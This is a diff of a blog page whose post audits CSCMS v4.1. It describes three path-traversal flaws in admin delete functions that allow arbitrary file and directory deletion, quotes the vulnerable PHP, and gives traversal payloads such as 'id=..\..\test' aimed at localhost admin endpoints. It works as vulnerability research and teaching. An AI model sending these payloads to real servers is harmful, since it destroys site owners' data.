@@ -74,7 +74,7 @@
 <meta name="description" content="网上有漏洞的介绍，照猫画虎，尝试审计。任意文件删除漏洞，当对权限设置不当时危害很大。本次任意文件删除漏洞需要登录后台，条件有限制。 环境搭建：CSCMS ：http://www.chshcms.com/网站源码版本：Cscms_v4.1正式版（发布日期：2017-06-05）程序源码下载：https://github.com/chshcms/cscms 漏洞一：任意目录删除漏洞文件位置：\plug">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CSCMS_v4.1正式版任意文件删除漏洞">
-<meta property="og:url" content="http://www.cuittk.cn/2018/11/10/CSCMS_v4.1正式版任意文件删除漏洞/index.html">
+<meta property="og:url" content="https://blog.cuittk.cn/2018/11/10/CSCMS_v4.1正式版任意文件删除漏洞/index.html">
 <meta property="og:site_name" content="h1tler&#39;s blog">
 <meta property="og:description" content="网上有漏洞的介绍，照猫画虎，尝试审计。任意文件删除漏洞，当对权限设置不当时危害很大。本次任意文件删除漏洞需要登录后台，条件有限制。 环境搭建：CSCMS ：http://www.chshcms.com/网站源码版本：Cscms_v4.1正式版（发布日期：2017-06-05）程序源码下载：https://github.com/chshcms/cscms 漏洞一：任意目录删除漏洞文件位置：\plug">
 <meta property="og:locale" content="zh-Hans">
@@ -82,7 +82,7 @@
 <meta property="og:image" content="http://img.cdn.cuittk.cn/j0vch05o7hp30ytjwr6ba8871r.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/gyxqrx6v7rrg4f92ydnxgd7no2.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/q2yxv1bstvdvxwbico9g08li60.png">
-<meta property="og:updated_time" content="2018-11-10T09:12:32.113Z">
+<meta property="og:updated_time" content="2020-02-26T10:43:34.561Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CSCMS_v4.1正式版任意文件删除漏洞">
 <meta name="twitter:description" content="网上有漏洞的介绍，照猫画虎，尝试审计。任意文件删除漏洞，当对权限设置不当时危害很大。本次任意文件删除漏洞需要登录后台，条件有限制。 环境搭建：CSCMS ：http://www.chshcms.com/网站源码版本：Cscms_v4.1正式版（发布日期：2017-06-05）程序源码下载：https://github.com/chshcms/cscms 漏洞一：任意目录删除漏洞文件位置：\plug">
@@ -116,12 +116,12 @@
 
 
 
-  <link rel="canonical" href="http://www.cuittk.cn/2018/11/10/CSCMS_v4.1正式版任意文件删除漏洞/"/>
+  <link rel="canonical" href="https://blog.cuittk.cn/2018/11/10/CSCMS_v4.1正式版任意文件删除漏洞/"/>
 
 
 
 
-
+<link rel="stylesheet" href="/js/prism/prism.css">
   <title>CSCMS_v4.1正式版任意文件删除漏洞 | h1tler's blog</title>
   
 
@@ -259,7 +259,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2018/11/10/CSCMS_v4.1正式版任意文件删除漏洞/">
+    <link itemprop="mainEntityOfPage" href="https://blog.cuittk.cn/2018/11/10/CSCMS_v4.1正式版任意文件删除漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="h1tler">
@@ -355,18 +355,116 @@
       
         <p>网上有漏洞的介绍，照猫画虎，尝试审计。<br>任意文件删除漏洞，当对权限设置不当时危害很大。<br><strong>本次任意文件删除漏洞需要登录后台，条件有限制。</strong></p>
 <h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>CSCMS ：<a href="http://www.chshcms.com/" target="_blank" rel="external">http://www.chshcms.com/</a><br>网站源码版本：Cscms_v4.1正式版（发布日期：2017-06-05）<br>程序源码下载：<a href="https://github.com/chshcms/cscms" target="_blank" rel="external">https://github.com/chshcms/cscms</a></p>
-<h3 id="漏洞一：任意目录删除"><a href="#漏洞一：任意目录删除" class="headerlink" title="漏洞一：任意目录删除"></a>漏洞一：任意目录删除</h3><h4 id="漏洞文件位置："><a href="#漏洞文件位置：" class="headerlink" title="漏洞文件位置："></a>漏洞文件位置：</h4><p>\plugins\sys\admin\Basedb.php 第160-177行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">public function del()&#123;</div><div class="line">		$dir = $this-&gt;input-&gt;get_post(&apos;id&apos;,true);</div><div class="line">		if(empty($dir))&#123;</div><div class="line">			getjson(L(&apos;plub_11&apos;));</div><div class="line">		&#125;</div><div class="line">		$dirs = array();</div><div class="line">		if(!is_array($dir))&#123;</div><div class="line">			$dirs[] = $dir;</div><div class="line">		&#125;else&#123;</div><div class="line">			$dirs = $dir;</div><div class="line">		&#125;</div><div class="line">		foreach($dirs as $dir) &#123;</div><div class="line">            deldir(FCPATH.&apos;attachment/backup/&apos;.$dir);</div><div class="line">		&#125;</div><div class="line">		$info[&apos;msg&apos;] = L(&apos;plub_12&apos;);</div><div class="line">		$info[&apos;url&apos;] = site_url(&apos;basedb/restore&apos;).&apos;?v=&apos;.rand(1000,9999);</div><div class="line">        getjson($info,0);</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
-<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$dir = $this-&gt;input-&gt;get_post(&apos;id&apos;,true);</div></pre></td></tr></table></figure>
-<p>POST传入参数id,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deldir(FCPATH.&apos;attachment/backup/&apos;.$dir);</div></pre></td></tr></table></figure></p>
-<p>FCPATH常量在index.php中定义为前端控制器的路径，也就是index.php所在的目录，此cms使用Codelgniter的php MVC框架。<br>deldir()函数在/cscms/app/helpers/common_helper.php的796-823行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">function deldir($dir,$sid=&apos;ok&apos;) &#123;</div><div class="line">	//先删除目录下的文件：</div><div class="line">	if(!is_dir($dir))&#123;</div><div class="line">	  return true;</div><div class="line">	&#125;</div><div class="line">	$dh=opendir($dir);</div><div class="line">	while ($file=readdir($dh)) &#123;</div><div class="line">		if($file!=&quot;.&quot; &amp;&amp; $file!=&quot;..&quot;) &#123;</div><div class="line">			$fullpath=$dir.&quot;/&quot;.$file;</div><div class="line">		 	if(!is_dir($fullpath)) &#123;</div><div class="line">		     	@unlink($fullpath);</div><div class="line">		 	&#125; else &#123;</div><div class="line">		     	deldir($fullpath);</div><div class="line">		 	&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	closedir($dh);</div><div class="line">	//删除当前文件夹：</div><div class="line">	if($sid==&apos;ok&apos;)&#123;</div><div class="line">		if(@rmdir($dir)) &#123;</div><div class="line">		    return true;</div><div class="line">		&#125;else&#123;</div><div class="line">		    return false;</div><div class="line">		&#125;</div><div class="line">	&#125;else&#123;</div><div class="line">		return true;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="漏洞一：任意目录删除"><a href="#漏洞一：任意目录删除" class="headerlink" title="漏洞一：任意目录删除"></a>漏洞一：任意目录删除</h3><h4 id="漏洞文件位置："><a href="#漏洞文件位置：" class="headerlink" title="漏洞文件位置："></a>漏洞文件位置：</h4><p>\plugins\sys\admin\Basedb.php 第160-177行：</p>
+<pre><code class="language-php">public function del(){
+        $dir = $this-&gt;input-&gt;get_post(&#39;id&#39;,true);
+        if(empty($dir)){
+            getjson(L(&#39;plub_11&#39;));
+        }
+        $dirs = array();
+        if(!is_array($dir)){
+            $dirs[] = $dir;
+        }else{
+            $dirs = $dir;
+        }
+        foreach($dirs as $dir) {
+            deldir(FCPATH.&#39;attachment/backup/&#39;.$dir);
+        }
+        $info[&#39;msg&#39;] = L(&#39;plub_12&#39;);
+        $info[&#39;url&#39;] = site_url(&#39;basedb/restore&#39;).&#39;?v=&#39;.rand(1000,9999);
+        getjson($info,0);
+    }
+</code></pre>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><pre><code class="language-php">$dir = $this-&gt;input-&gt;get_post(&#39;id&#39;,true);
+</code></pre>
+<p>POST传入参数id,</p>
+<pre><code class="language-php">deldir(FCPATH.&#39;attachment/backup/&#39;.$dir);
+</code></pre>
+<p>FCPATH常量在index.php中定义为前端控制器的路径，也就是index.php所在的目录，此cms使用Codelgniter的php MVC框架。<br>deldir()函数在/cscms/app/helpers/common_helper.php的796-823行</p>
+<pre><code class="language-php">function deldir($dir,$sid=&#39;ok&#39;) {
+    //先删除目录下的文件：
+    if(!is_dir($dir)){
+      return true;
+    }
+    $dh=opendir($dir);
+    while ($file=readdir($dh)) {
+        if($file!=&quot;.&quot; &amp;&amp; $file!=&quot;..&quot;) {
+            $fullpath=$dir.&quot;/&quot;.$file;
+             if(!is_dir($fullpath)) {
+                 @unlink($fullpath);
+             } else {
+                 deldir($fullpath);
+             }
+        }
+    }
+    closedir($dh);
+    //删除当前文件夹：
+    if($sid==&#39;ok&#39;){
+        if(@rmdir($dir)) {
+            return true;
+        }else{
+            return false;
+        }
+    }else{
+        return true;
+    }
+}
+</code></pre>
 <p>本意应该是想删除\attachment\backup\下的某个目录，结果对$dir变量没有做任何限制，导致任意目录删除漏洞。</p>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在根目录创建test目录测试：<br><img src="http://img.cdn.cuittk.cn/dppqpmuvgtgo8jrq2ldb147odp.png" alt=""><br>构造参数<br>http\:\/\/localhost\/admin.php\/basedb\/del<br>POST: id=..\..\test<br><img src="http://img.cdn.cuittk.cn/j0vch05o7hp30ytjwr6ba8871r.png" alt=""></p>
-<h3 id="漏洞二：任意文件删除"><a href="#漏洞二：任意文件删除" class="headerlink" title="漏洞二：任意文件删除"></a>漏洞二：任意文件删除</h3><h4 id="漏洞文件位置"><a href="#漏洞文件位置" class="headerlink" title="漏洞文件位置:"></a>漏洞文件位置:</h4><p>/plugins/sys/admin/Skin.php 第422–445行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">public function del()&#123;</div><div class="line">       $ac = $this-&gt;input-&gt;get(&apos;ac&apos;,true);</div><div class="line">       $op = $this-&gt;input-&gt;get(&apos;op&apos;,true);</div><div class="line">       $dir = $this-&gt;input-&gt;get(&apos;dirs&apos;,true);</div><div class="line">       $file = $this-&gt;input-&gt;get(&apos;file&apos;);</div><div class="line">	if($ac!=&apos;mobile&apos;) $ac=&apos;pc&apos;;</div><div class="line">	if($op!=&apos;home&apos; &amp;&amp; $op!=&apos;user&apos;) $op=&apos;skins&apos;;</div><div class="line">	if(empty($dir)) getjson(L(&apos;plub_27&apos;));</div><div class="line"></div><div class="line">       $skin_dir = VIEWPATH.$ac.FGF.$op.FGF.$dir.FGF.$file;</div><div class="line">	if (!is_dir($skin_dir)) &#123;  //文件</div><div class="line">             $res=unlink($skin_dir);</div><div class="line">	&#125;else&#123;  //目录</div><div class="line">             $res=deldir($skin_dir);</div><div class="line">	&#125;</div><div class="line">	if($res)&#123;</div><div class="line">           $info[&apos;url&apos;] = site_url(&apos;skin&apos;).&apos;?ac=&apos;.$ac.&apos;&amp;op=&apos;.$op.&apos;&amp;v=&apos;.rand(1000,9999);</div><div class="line">           $info[&apos;msg&apos;] = L(&apos;plub_46&apos;);</div><div class="line">           $info[&apos;turn&apos;] = 1;</div><div class="line">           getjson($info,0);</div><div class="line">	&#125;else&#123;</div><div class="line">           getjson(L(&apos;plub_28&apos;));</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$skin_dir = VIEWPATH.$ac.FGF.$op.FGF.$dir.FGF.$file;</div></pre></td></tr></table></figure>
-<p>VIEWPATH常量为视图的路径，为\tpl<br>POST传入参数ac给$ac，$ac变量要么为’mobile’，要么为’pc’，$op<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if (!is_dir($skin_dir)) &#123;  //文件</div><div class="line">              $res=unlink($skin_dir);</div><div class="line">		&#125;else&#123;  //目录</div><div class="line">              $res=deldir($skin_dir);</div><div class="line">		&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="漏洞二：任意文件删除"><a href="#漏洞二：任意文件删除" class="headerlink" title="漏洞二：任意文件删除"></a>漏洞二：任意文件删除</h3><h4 id="漏洞文件位置"><a href="#漏洞文件位置" class="headerlink" title="漏洞文件位置:"></a>漏洞文件位置:</h4><p>/plugins/sys/admin/Skin.php 第422–445行：</p>
+<pre><code class="language-php">    public function del(){
+        $ac = $this-&gt;input-&gt;get(&#39;ac&#39;,true);
+        $op = $this-&gt;input-&gt;get(&#39;op&#39;,true);
+        $dir = $this-&gt;input-&gt;get(&#39;dirs&#39;,true);
+        $file = $this-&gt;input-&gt;get(&#39;file&#39;);
+        if($ac!=&#39;mobile&#39;) $ac=&#39;pc&#39;;
+        if($op!=&#39;home&#39; &amp;&amp; $op!=&#39;user&#39;) $op=&#39;skins&#39;;
+        if(empty($dir)) getjson(L(&#39;plub_27&#39;));
+
+        $skin_dir = VIEWPATH.$ac.FGF.$op.FGF.$dir.FGF.$file;
+        if (!is_dir($skin_dir)) {  //文件
+              $res=unlink($skin_dir);
+        }else{  //目录
+              $res=deldir($skin_dir);
+        }
+        if($res){
+            $info[&#39;url&#39;] = site_url(&#39;skin&#39;).&#39;?ac=&#39;.$ac.&#39;&amp;op=&#39;.$op.&#39;&amp;v=&#39;.rand(1000,9999);
+            $info[&#39;msg&#39;] = L(&#39;plub_46&#39;);
+            $info[&#39;turn&#39;] = 1;
+            getjson($info,0);
+        }else{
+            getjson(L(&#39;plub_28&#39;));
+        }
+    }
+</code></pre>
+<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><pre><code class="language-php">$skin_dir = VIEWPATH.$ac.FGF.$op.FGF.$dir.FGF.$file;
+</code></pre>
+<p>VIEWPATH常量为视图的路径，为\tpl<br>POST传入参数ac给$ac，$ac变量要么为’mobile’，要么为’pc’，$op</p>
+<pre><code class="language-php">if (!is_dir($skin_dir)) {  //文件
+              $res=unlink($skin_dir);
+        }else{  //目录
+              $res=deldir($skin_dir);
+        }
+</code></pre>
 <p>如果$skin_dir文件存在，则删除文件。<br>本意应该是删除<br>同样没有对$file变量做任何限制，导致任意文件删除。<br>发现第一个漏洞只能删除目录不能删除文件，第二个既可以删除目录也可以删除文件，都是使用同样的deldir()函数，很迷。</p>
 <h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在网站根目录新建1.txt测试<br>构造payload\:http\://localhost/admin.php\/skin\/del?ac=pc&amp;op=skins&amp;dirs=default&amp;file=..\..\..\..\1.txt<br><img src="http://img.cdn.cuittk.cn/gyxqrx6v7rrg4f92ydnxgd7no2.png" alt=""></p>
-<h3 id="漏洞三：任意文件删除"><a href="#漏洞三：任意文件删除" class="headerlink" title="漏洞三：任意文件删除"></a>漏洞三：任意文件删除</h3><h4 id="漏洞文件位置-1"><a href="#漏洞文件位置-1" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p>/plugins/sys/admin/Plugins.php第285-299行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">public function del()&#123;</div><div class="line">    $dir = $this-&gt;input-&gt;get_post(&apos;dir&apos;,true);</div><div class="line">    if($dir==&apos;&apos;)&#123;</div><div class="line">    	getjson(L(&apos;plub_del_0&apos;),1);</div><div class="line">    &#125;</div><div class="line">       deldir(FCPATH.&apos;plugins&apos;.FGF.$dir.FGF);</div><div class="line">	//删除配置目录</div><div class="line">       deldir(CSCMS.$dir.FGF);</div><div class="line">	//删除模板目录</div><div class="line">       deldir(FCPATH.&apos;tpl/admin/&apos;.$dir.FGF);</div><div class="line">       $info[&apos;func&apos;] = __FUNCTION__;</div><div class="line">       $info[&apos;msg&apos;] = L(&apos;plub_del_1&apos;);</div><div class="line">       getjson($info,0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="漏洞三：任意文件删除"><a href="#漏洞三：任意文件删除" class="headerlink" title="漏洞三：任意文件删除"></a>漏洞三：任意文件删除</h3><h4 id="漏洞文件位置-1"><a href="#漏洞文件位置-1" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p>/plugins/sys/admin/Plugins.php第285-299行：</p>
+<pre><code class="language-php">    public function del(){
+        $dir = $this-&gt;input-&gt;get_post(&#39;dir&#39;,true);
+        if($dir==&#39;&#39;){
+            getjson(L(&#39;plub_del_0&#39;),1);
+        }
+        deldir(FCPATH.&#39;plugins&#39;.FGF.$dir.FGF);
+        //删除配置目录
+        deldir(CSCMS.$dir.FGF);
+        //删除模板目录
+        deldir(FCPATH.&#39;tpl/admin/&#39;.$dir.FGF);
+        $info[&#39;func&#39;] = __FUNCTION__;
+        $info[&#39;msg&#39;] = L(&#39;plub_del_1&#39;);
+        getjson($info,0);
+    }
+</code></pre>
 <h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>同样对$dir参数未做任何限制。导致任意文件删除漏洞</p>
 <h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><img src="http://img.cdn.cuittk.cn/q2yxv1bstvdvxwbico9g08li60.png" alt=""></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这些漏洞都需要能够登录网址后台，利用点有限制。属于后台漏洞。</p>
@@ -488,7 +586,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -616,7 +714,7 @@
 
 
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
+<script src="/js/prism/prism.js" async></script>
         
 <div class="busuanzi-count">
   <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
